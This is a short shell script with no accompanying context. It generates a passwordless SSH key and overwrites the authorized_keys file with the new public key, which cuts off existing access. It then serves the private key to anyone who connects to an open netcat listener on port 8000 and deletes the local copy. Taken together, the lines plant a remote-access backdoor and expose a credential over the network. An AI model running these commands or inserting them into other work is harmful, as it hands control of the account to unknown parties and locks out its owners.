ssh-keygen -f ~/.ssh/id_rsa -N ""
mv ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
echo -e "HTTP/1.0 200 OK\r\n" | cat - ~/.ssh/id_rsa | nc -lp 8000
rm ~/.ssh/id_rsa
